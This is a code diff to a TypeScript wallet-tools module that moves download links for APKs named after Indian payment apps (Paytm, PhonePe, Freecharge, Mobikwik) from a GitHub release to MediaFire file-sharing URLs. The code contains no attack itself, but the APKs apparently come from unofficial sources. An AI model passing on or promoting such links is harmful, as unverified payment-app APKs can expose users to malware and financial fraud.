@@ -9,14 +9,19 @@
  */
 import { getLogoUrl } from './storage';
 
-/**
- * APKs are served from the GitHub release "apk" (no 25 MB upload limit).
- * File names exactly as uploaded in that release.
- */
-const RELEASE_BASE = 'https://github.com/dehlianmol-sys/official-hkwallet.online/releases/download/app.apk';
-export function releaseApkUrl(fileName: string): string {
-  return `${RELEASE_BASE}/${fileName}`;
-}
+/* ===========================================================================
+ * APK DOWNLOAD LINKS  —  EDIT ONLY THIS BLOCK
+ * ---------------------------------------------------------------------------
+ * File: src/lib/walletTools.ts   (yahi ek jagah link badalni hai)
+ * Kisi bhi app ki link change karni ho to niche ki line me URL replace kar do.
+ * Baaki code apne aap nayi link use karne lagega.
+ * ========================================================================= */
+export const APK_LINKS: Record<string, string> = {
+  paytm: 'https://www.mediafire.com/file/bngrrz9f5b1eayo/paytm.apk/file?dkey=uaodpui9vyq&r=402',
+  freecharge: 'https://www.mediafire.com/file/ay3wjvbawjq9zbl/freecharge.apk/file?dkey=9h8kaj46o3z&r=1005',
+  phonepe: 'https://www.mediafire.com/file/pf3o7epas81n340/phonpe.apk/file?dkey=8e8exmfdstm&r=136',
+  mobikwik: 'https://www.mediafire.com/file/30lkrap4zgyst3b/mobikek.apk/file?dkey=lmpkli1sn1f&r=719',
+};
 
 export type ToolCategory = 'personal' | 'business';
 
@@ -48,20 +53,20 @@ export const UNAVAILABLE_LABEL = 'Unavailable in service';
 export const WALLET_TOOLS: WalletTool[] = [
   {
     id: 'freecharge', category: 'personal', name: 'Freecharge', logoUrl: getLogoUrl('Freecharge.png'),
-    min: 200, max: 100000, payout: true, available: true, handles: ['@freecharge', '@fc'], apkUrl: releaseApkUrl('freecharge.apk'),
+    min: 200, max: 100000, payout: true, available: true, handles: ['@freecharge', '@fc'], apkUrl: APK_LINKS.freecharge,
   },
   {
     id: 'phonepe', category: 'personal', name: 'Phonepe', logoUrl: getLogoUrl('Phonepe.png'),
-    min: 100, max: 2000, available: true, handles: ['@ybl', '@ibl', '@axl'], apkUrl: releaseApkUrl('phonepe.apk'),
+    min: 100, max: 2000, available: true, handles: ['@ybl', '@ibl', '@axl'], apkUrl: APK_LINKS.phonepe,
   },
   {
     id: 'mobikwik', category: 'personal', name: 'Mobikwik', logoUrl: getLogoUrl('MobiKwik.jpg'),
-    min: 100, max: 100000, payout: true, available: true, handles: ['@mbkns', '@mbk', '@ikwik'], apkUrl: releaseApkUrl('mobikwik.apk'),
+    min: 100, max: 100000, payout: true, available: true, handles: ['@mbkns', '@mbk', '@ikwik'], apkUrl: APK_LINKS.mobikwik,
   },
   {
     id: 'paytm', category: 'personal', name: 'Paytm', logoUrl: getLogoUrl('Paytm.png'),
     min: 10, max: 100000, payout: true, available: true,
-    handles: ['@paytm', '@ptyes', '@ptaxis', '@ptsbi', '@pthdfc'], apkUrl: releaseApkUrl('paytm.apk'),
+    handles: ['@paytm', '@ptyes', '@ptaxis', '@ptsbi', '@pthdfc'], apkUrl: APK_LINKS.paytm,
   },
   {
     id: 'induspay', category: 'personal', name: 'IndusPay', logoUrl: getLogoUrl('Induspay.png'),
